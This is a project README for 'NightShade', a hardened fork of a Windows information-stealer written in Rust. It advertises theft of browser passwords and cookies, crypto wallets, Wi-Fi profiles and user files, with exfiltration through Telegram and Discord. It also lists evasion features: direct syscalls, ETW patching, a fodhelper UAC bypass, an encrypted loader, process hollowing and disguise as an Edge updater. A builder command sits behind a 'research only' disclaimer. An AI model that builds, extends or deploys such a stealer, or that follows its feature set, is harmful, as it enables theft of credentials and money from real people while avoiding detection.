<div align="center">
    <h1>NightShade</h1>
    <p>A hardened fork of <a href="https://github.com/sqlerrorthing/ShadowSniff">ShadowSniff</a> — lightweight Windows information-stealing research tool written in Rust.</p>
    <p><b>PoC. For educational and authorized red-team use only.</b></p>
</div>

---

## What NightShade adds on top of upstream ShadowSniff

### Reliability
- **Panic-proof JSON parser** — bounds-checked tokenizer/parser, surrogate-pair support, recursion depth cap (empty/truncated API responses can no longer kill the run)
- **Crash-proof Chromium decryption** — length validation on every crypto blob, strict `DPAPI`/`APPB` prefix checks, no more index-out-of-bounds on malformed cookies
- **Fail-soft geo-IP** — offline machines continue with `Unknown` placeholders instead of aborting
- **HTTP status verification in every sender** — no more silent "success" on 4xx/5xx
- **Schema-adaptive cookie readers** — Chromium *and* Gecko cookie columns are resolved from `pragma_table_info` at runtime, so browser schema updates no longer silently drop everything
- **WAL sidecar replay** — in-memory WAL frame application makes rows written while the browser was running visible
- **Native Firefox password decryption** — key4.db (NSS PBKDF2-SHA256 + 3DES) decrypted in-process, no PasswordFox needed

### Coverage
- **28 Chromium-based browsers** (was 20) + profile detection via `Preferences`
- **Wi-Fi profiles, crypto wallets (Exodus/Electrum/Atomic/Guarda/MetaMask), user files** (Documents/Desktop/Downloads, bucketed Documents/Databases/Source Code)
- Chromium ≥127 App-Bound path via the **IElevator COM elevation service** (needs elevated/SYSTEM context)

### Evasion
- **Halo's/Hell's Gate direct syscalls** + ETW patch through unhooked `NtProtectVirtualMemory`
- **UAC auto-elevation** (fodhelper route) with graceful non-elevated fallback
- **Per-build random padding** — every binary hash is unique
- **2-stage crypter** — the shipped binary is a tiny loader carrying an AES-256-GCM-encrypted payload with a per-build random key (`DECRYPT_LOG.py` and the builder handle the plumbing)
- **Masquerading** — ships as `MicrosoftEdgeUpdate.exe` with generated icon + full version resources

### Operations
- **AES-256-GCM log container** (`SNAES1` format) replacing ZipCrypto-only protection
- **Telegram / Discord senders with real HTTP status handling**, escaping, correct Bot API size limits, Catbox/Gofile/tmpfiles fallback chain
- **Interactive builder** (`cargo run -p builder --release`) with config-file support, per-build signing and crypter options
- Hand-rolled SQLite (3.46) reader, custom allocator, transacted-section process hollowing module

## Building

```bash
cargo run -p builder --release -- --config config.json   # config-driven build
# or: cargo run -p builder --release                     # interactive prompts
```

Requires Rust nightly + Visual Studio C++ toolchain. `just release` applies size-optimal flags.

## License

MIT — inherited from upstream. Original work by [sqlerrorthing](https://github.com/sqlerrorthing/ShadowSniff); this fork's hardening changes are released under the same terms.

**Disclaimer:** this project is published for malware research, defence analysis and authorized red-team engagements. The authors do not condone illegal use.
